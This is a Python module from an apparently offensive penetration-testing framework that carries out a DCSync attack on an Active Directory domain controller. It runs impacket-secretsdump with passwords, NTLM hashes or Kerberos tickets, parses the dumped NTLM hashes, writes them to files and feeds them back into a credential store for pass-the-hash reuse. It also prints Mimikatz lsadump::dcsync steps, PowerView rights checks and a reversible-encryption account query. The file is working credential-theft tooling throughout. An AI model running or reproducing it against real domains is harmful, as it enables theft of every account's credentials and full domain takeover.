def run(
data,
cred,
args,
):

    import argparse
    import subprocess
    from datetime import datetime

    from core.paths import (
        get_artifacts_dir,
        get_tools_dir
    )

    from core.target import (
        target_add_cred
    )

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'

    #
    # WINDOWS REFERENCE
    #

    if getattr(
        args,
        "windows",
        False
    ):

        from modules.upload.windows import (
            stage_windows_files
        )

        print(
            f"{B}[?]{W} Transfer Mimikatz?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            windows_tools = (
                get_tools_dir()
                / "windows"
            )

            mimikatz = (
                windows_tools /
                "mimikatz.exe"
            )

            stage_windows_files([
                mimikatz
            ], 
            data=data,
            )

        print(
            f"\n{B}┌── DCSYNC ──────────────────────────┐{W}"
        )

        print(
            f"{B}│{W}  Select Method                   {B}│{W}"
        )

        print(
            f"{B}└────────────────────────────────────┘{W}\n"
        )

        print(
            f"  {B}[1]{W} Check DCSync Rights"
        )

        print(
            f"  {B}[2]{W} Mimikatz DCSync"
        )

        print(
            f"  {B}[3]{W} Reversible Encryption\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            print(
                f"\n{G}[+] {W}Check DCSync Rights\n"
            )

            print(
                f"{Y}Import-Module .\\PowerView.ps1{W}"
            )

            print()

            print(
                f"{Y}$sid = Convert-NameToSid {C}<user>{W}"
            )

            print()

            print(
                f"{Y}Get-ObjectAcl \"DC={data.get('domain','DOMAIN').split('.')[0]},DC=LOCAL\" -ResolveGUIDs | ? {{ ($_.ObjectAceType -match 'Replication-Get') }} | ? {{ $_.SecurityIdentifier -match $sid }} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl{W}"
            )

            print()

        elif choice == "2":

            target = input(
                f"{Y}Target User [Administrator]> {W}"
            ).strip()

            if not target:
                target = "Administrator"

            print(
                f"\n{G}[+] {W}Mimikatz DCSync\n"
            )
            user = cred.get("user")
            password = cred.get("secret")

            print(f"{Y}runas /netonly {C}/user:inlanefreight.local\{user} {Y}powershell.exe")
            print(f"{password}")

            print(
                f"{Y}.\mimikatz.exe{W}"
            )

            print()

            print(
                f"{Y}privilege::debug{W}"
            )

            print()

            print(
                f"{Y}lsadump::dcsync /domain:{C}{data.get('domain')}{Y} /user:{C}{data.get('domain').split('.')[0]}\\{target}{W}"
            )

            print()

        elif choice == "3":

            print(
                f"\n{G}[+] {W}Reversible Encryption\n"
            )

            print(
                f"{Y}Import-Module ActiveDirectory{W}"
            )

            print()

            print(
                f"{Y}Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl{W}"
            )

            print()

            print(
                f"{Y}Get-DomainUser -Identity * | ? {{$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}} | select samaccountname,useraccountcontrol{W}"
            )

            print()

        return set()

    #
    # IMPACKET DCSYNC
    #

    if not cred:

        print(
            f"\n{R}[!] {W}DCSync requires credentials\n"
        )

        return set()

    domain = data.get(
        "domain"
    )

    dc = data.get(
        "ip"
    )

    target_name = data.get(
        "name"
    )

    if not domain or not dc:

        print(
            f"\n{R}[!] {W}Missing domain or DC IP\n"
        )

        return set()

    target_user = getattr(
        args,
        "user",
        None
    )

    if not target_user:

        extra = getattr(
            args,
            "extra",
            []
        ) or []

        pos = [
            x for x in extra
            if not x.startswith("-")
        ]

        target_user = (
            pos[0]
            if pos
            else "Administrator"
        )


    dump_all = (
        getattr(
            args,
            "all",
            False
        )
        or "--all" in getattr(
            args,
            "extra",
            []
        )
    )


    if not dump_all:

        netbios = (
            domain.split(".")[0]
            .upper()
        )

        target_user = (
            f"{netbios}/{target_user}"
        )

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    label = (
        "full_domain"
        if dump_all
        else target_user.split("/")[-1].lower()
    )

    logfile = (
        get_artifacts_dir(
            target_name
        )
        / f"{label}_dcsync_{timestamp}.log"
    )

    hashes_file = (
        get_artifacts_dir(
            target_name
        )
        / f"{label}_hashes.txt"
    )

    user = cred["user"]
    secret = cred["secret"]
    cred_type = cred["type"]

    cmd = [
        "impacket-secretsdump"
    ]

    if not dump_all:

        cmd.extend([
            "-just-dc-user",
            target_user
        ])

    cmd.extend([
        "-dc-ip",
        str(dc)
    ])

    if cred_type == "password":

        cmd.append(
            f"{domain}/{user}:{secret}@{dc}"
        )

    elif cred_type == "ntlm":

        cmd.extend([
            "-hashes",
            f":{secret}"
        ])

        cmd.append(
            f"{domain}/{user}@{dc}"
        )

    elif cred_type == "ticket":

        cmd.extend([
            "-k",
            "-no-pass"
        ])

        cmd.append(
            f"{domain}/{user}@{dc}"
        )

    else:

        print(
            f"{R}[!] {W}Unsupported credential type\n"
        )

        return set()

    print(
        f"\n{B}[*]{W} DCSync\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    output = (
        result.stdout
        + result.stderr
    )

    logfile.write_text(
        output
    )

    recovered = []

    for line in output.splitlines():

        try:

            parts = line.split(
                ":"
            )

            if len(parts) < 4:
                continue

            ntlm = parts[3]

            if len(
                ntlm
            ) != 32:
                continue

            username = parts[0]

            if "\\" in username:

                username = (
                    username
                    .split("\\")[-1]
                )

            recovered.append({
                "user": username,
                "type": "ntlm",
                "secret": ntlm
            })

        except Exception:
            pass

    recovered = list({
        (
            x["user"],
            x["secret"]
        ): x
        for x in recovered
    }.values())

    hashes_file.write_text(
        "\n".join(
            f"{x['user']}:{x['secret']}"
            for x in recovered
        )
    )

    print(
        f"{G}[+] {W}"
        f"{len(recovered)} account(s) recovered\n"
    )

    for account in recovered[:20]:

        print(
            f"  {B}├──{W} "
            f"{C}{account['user']}{W}"
        )

    print()

    for account in recovered:

        target_add_cred(
            argparse.Namespace(
                user=account["user"],
                password=None,
                hash=account["secret"],
                aes=None,
                ccache=None
            )
        )

    print(
        f"{G}[+] {W}Saved\n"
    )

    print(
        f"  {B}├── {C}{hashes_file}{W}"
    )

    print(
        f"  {B}└── {C}{logfile}{W}\n"
    )

    return recovered


